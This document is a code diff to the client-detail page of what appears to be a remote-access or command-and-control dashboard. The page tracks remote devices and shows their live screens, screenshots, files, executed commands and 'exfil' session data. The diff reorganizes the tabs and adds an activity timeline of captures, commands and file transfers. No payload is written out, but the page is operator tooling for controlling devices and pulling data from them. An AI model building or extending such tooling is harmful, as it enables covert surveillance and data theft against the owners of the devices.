@@ -98,7 +98,7 @@ export default function ClientDetailPage() {
   const router = useRouter()
   const [client, setClient] = useState<any>(null)
   const [loading, setLoading] = useState(true)
-  const [activeTab, setActiveTab] = useState<"overview" | "screen" | "terminal" | "files" | "screenshots" | "map" | "data" | "basedata" | "explorer">("screen")
+  const [activeTab, setActiveTab] = useState<"overview" | "screen" | "terminal" | "screenshots" | "basedata" | "explorer" | "activity" | "map" | "data" | "files">("screen")
   const [command, setCommand] = useState("")
   const [commandHistory, setCommandHistory] = useState<any[]>([])
   const [sending, setSending] = useState(false)
@@ -153,7 +153,7 @@ export default function ClientDetailPage() {
   }
 
   useEffect(() => {
-    if ((activeTab === "data" || activeTab === "basedata") && params.id) fetchExfilData()
+    if ((activeTab === "basedata") && params.id) fetchExfilData()
   }, [activeTab, params.id])
 
   // Auto-refresh every 15s
@@ -272,17 +272,16 @@ export default function ClientDetailPage() {
   }
 
   const isOnline = client.status === "online"
-  const flagEmoji = client.countryCode ? String.fromCodePoint(...[...client.countryCode.toUpperCase()].map(c => 0x1F1E6 + c.charCodeAt(0) - 65)) : ""
+  const flagEmoji = (() => { try { const c=client.countryCode?.toUpperCase()||""; return c.length===2?String.fromCodePoint(0x1F1E6+c.charCodeAt(0)-65,0x1F1E6+c.charCodeAt(1)-65):"" } catch { return "" } })()
 
   const tabs = [
-    { id: "screen" as const, label: "Screen", icon: "M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z" },
-    { id: "map" as const, label: "Map", icon: "M21 10c0 7-9 13-9 13s-9-6-9-13a9 9 0 0118 0z M12 10a2 2 0 100 4 2 2 0 000-4z" },
-    { id: "overview" as const, label: "Info", icon: "M4 6h16M4 12h16M4 18h16" },
+    { id: "screen" as const, label: "Live", icon: "M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z" },
+    { id: "overview" as const, label: "Overview", icon: "M4 6h16M4 12h16M4 18h16" },
     { id: "terminal" as const, label: "Commands", icon: "M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8z M14 2v6h6" },
+    { id: "explorer" as const, label: "Files", icon: "M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z" },
+    { id: "activity" as const, label: "Activity", icon: "M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" },
     { id: "screenshots" as const, label: "Gallery", icon: "M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01" },
-    { id: "data" as const, label: "Data", icon: "M4 7v10c0 2 1 3 3 3h10c2 0 3-1 3-3V7M9 3h6M12 3v4" },
     { id: "basedata" as const, label: "Session", icon: "M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z" },
-    { id: "explorer" as const, label: "Explorer", icon: "M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z" },
   ]
 
   return (
@@ -310,13 +309,13 @@ export default function ClientDetailPage() {
       </div>
 
       {/* Tab Bar */}
-      <div className="flex gap-1 p-1 bg-zinc-900/60 rounded-2xl w-fit border border-zinc-800 overflow-x-auto">
+      <div className="flex gap-1 p-1 bg-card/60 backdrop-blur-sm rounded-2xl w-fit border border-border/50 overflow-x-auto">
         {tabs.map((tab) => (
           <button
             key={tab.id}
             onClick={() => setActiveTab(tab.id)}
             className={`flex items-center gap-1.5 px-3 py-2 rounded-xl text-xs font-medium transition-all whitespace-nowrap ${
-              activeTab === tab.id ? "bg-primary/20 text-primary" : "text-zinc-400 hover:text-white"
+              activeTab === tab.id ? "bg-primary/20 text-primary" : "text-muted-foreground hover:text-foreground"
             }`}
           >
             <svg className="w-3.5 h-3.5" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
@@ -892,6 +891,83 @@ export default function ClientDetailPage() {
             ].map(({ label, cmd }) => (
               <button key={cmd} onClick={() => sendCommand(cmd)} className="p-2 rounded-lg bg-zinc-800/50 border border-zinc-700/50 hover:bg-zinc-700 text-[10px] text-zinc-300 font-mono">{label}</button>
             ))}
+          </div>
+        </div>
+      )}
+
+      {/* ACTIVITY LOGS TAB */}
+      {activeTab === "activity" && (
+        <div className="space-y-3">
+          <div className="flex items-center justify-between">
+            <h2 className="text-sm font-semibold uppercase tracking-wider text-muted-foreground">📋 Activity Timeline</h2>
+          </div>
+          <div className="rounded-2xl border border-border/50 bg-card/60 p-5">
+            <div className="space-y-3">
+              {/* Connection event */}
+              <div className="flex items-start gap-3">
+                <div className="mt-0.5 w-2 h-2 rounded-full bg-green-500 shrink-0" />
+                <div className="flex-1 min-w-0">
+                  <p className="text-xs text-foreground font-medium">Device First Seen</p>
+                  <p className="text-[10px] text-muted-foreground">{new Date(client.firstSeen).toLocaleString()}</p>
+                </div>
+              </div>
+              <div className="flex items-start gap-3">
+                <div className={`mt-0.5 w-2 h-2 rounded-full shrink-0 ${isOnline ? "bg-green-500 animate-pulse" : "bg-red-500"}`} />
+                <div className="flex-1 min-w-0">
+                  <p className="text-xs text-foreground font-medium">{isOnline ? "Currently Online" : "Offline"}</p>
+                  <p className="text-[10px] text-muted-foreground">Last heartbeat: {new Date(client.lastSeen).toLocaleString()}</p>
+                </div>
+              </div>
+              {/* Screenshots */}
+              {client.screenCaptures?.map((sc: any, i: number) => (
+                <div key={sc.id} className="flex items-start gap-3">
+                  <div className="mt-0.5 w-2 h-2 rounded-full bg-blue-500 shrink-0" />
+                  <div className="flex-1 min-w-0">
+                    <p className="text-xs text-foreground font-medium">Screenshot Captured</p>
+                    <p className="text-[10px] text-muted-foreground">
+                      {sc.width && sc.height ? `${sc.width}x${sc.height} · ` : ""}
+                      {new Date(sc.createdAt).toLocaleString()}
+                    </p>
+                    {sc.imagePath && (
+                      <img src={sc.imagePath} alt="Screen" className="mt-2 rounded-lg border border-border/30 max-h-24 cursor-pointer hover:scale-105 transition-transform"
+                        onClick={() => { setScreenshot(sc.imagePath); setActiveTab("screen") }} />
+                    )}
+                  </div>
+                </div>
+              ))}
+              {/* Commands */}
+              {client.commands?.slice(0, 15).map((cmd: any) => (
+                <div key={cmd.id} className="flex items-start gap-3">
+                  <div className={`mt-0.5 w-2 h-2 rounded-full shrink-0 ${cmd.status === "completed" ? "bg-green-500" : cmd.status === "failed" ? "bg-red-500" : "bg-yellow-500"}`} />
+                  <div className="flex-1 min-w-0">
+                    <p className="text-xs text-foreground">
+                      <code className="text-primary font-mono">{cmd.command}</code>
+                      <span className={`ml-2 text-[10px] ${cmd.status === "completed" ? "text-green-400" : cmd.status === "failed" ? "text-red-400" : "text-yellow-400"}`}>
+                        {cmd.status || "pending"}
+                      </span>
+                    </p>
+                    {cmd.output && <p className="text-[10px] text-muted-foreground mt-0.5 whitespace-pre-wrap max-h-20 overflow-y-auto">{cmd.output.substring(0, 200)}</p>}
+                    <p className="text-[9px] text-muted-foreground/50 mt-0.5">{new Date(cmd.executedAt || cmd.createdAt).toLocaleString()}</p>
+                  </div>
+                </div>
+              ))}
+              {/* File transfers */}
+              {client.fileTransfers?.slice(0, 10).map((ft: any) => (
+                <div key={ft.id} className="flex items-start gap-3">
+                  <div className={`mt-0.5 w-2 h-2 rounded-full shrink-0 ${ft.direction === "upload" ? "bg-purple-500" : "bg-cyan-500"}`} />
+                  <div className="flex-1 min-w-0">
+                    <p className="text-xs text-foreground">{ft.direction === "upload" ? "⬆ Upload" : "⬇ Download"}: {ft.fileName}</p>
+                    <p className="text-[10px] text-muted-foreground">
+                      {ft.fileSize ? `${(ft.fileSize / 1024).toFixed(1)}KB · ` : ""}
+                      {ft.status} · {new Date(ft.startedAt).toLocaleString()}
+                    </p>
+                  </div>
+                </div>
+              ))}
+              {!client.screenCaptures?.length && !client.commands?.length && !client.fileTransfers?.length && (
+                <p className="text-xs text-muted-foreground text-center py-8">No activity recorded yet. Send a command to get started.</p>
+              )}
+            </div>
           </div>
         </div>
       )}
